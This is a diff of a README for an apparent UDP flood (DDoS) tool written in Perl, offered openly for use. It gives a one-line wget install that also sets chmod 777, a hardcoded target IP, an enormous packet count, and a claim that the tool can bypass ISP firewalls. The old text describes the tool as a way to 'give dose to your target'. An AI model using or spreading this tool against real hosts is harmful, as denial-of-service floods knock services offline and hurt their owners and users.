@@ -1,22 +1,57 @@
-Instruction How yo Give Dose to your Target --->
 
----------------------------------------------------------
-This script Generate Random UDP packet, 
-To ---> Random Port
-From ---> Random Port
----------------------------------------------------------
+## Features
+
+- Generate Random UDP Traffic
+- From Random Port
+- To Random Port
+- Require HPC (High Performance Computing) Server
+- Can bypass some ISP Firewalls
+- Language: Perl
+
+
+## Installation
+
+One Line Setup for Debian Based distro ~ Ubuntu, Debian
+
+```bash
+  wget https://raw.githubusercontent.com/cyberceros/ddos-dose/main/Layer4/UDP/random-udp.pl && chmod 777 * && apt update -y && apt install perl -y
+
+```
+    
+
+## Usage
+
+```
+Enter Target ---> 
+my $target_host = "117.203.8.210"; (Line6)
+```
+```
 You can edit Packet Size on Script --->
 my $max_size = 100; (Line 7) Define the max packet size
 my $min_size = 50;  (Line 8) Define the min packet size
----------------------------------------------------------
-You can set how much packet sent to Host?
+```
+```
+You can set how much packet sent to Host? --->
 my $packet_count = 1000000000000000; (Line9)
----------------------------------------------------------
+```
+```
+perl random-udp.pl
+```
 
-Please note:
-This script usages more CPU or RAM becaus it's generate
-random packet and use random port to send traffic to host
-to random port.
------------------------------------------------------------
-don't forgot to give me credit : @cyberceros
+
+## Related
+
+want to pass the Target IP, Packet Size, Packet Count in Command Line
+
+[Click Here for that Script](https://github.com/cyberceros/)
+
+
+## Authors
+
+- [@cyberceros](https://www.github.com/cyberceros)
+
+
+## Feedback
+
+If you have any feedback, please reach out to us at n@dultr.in
 
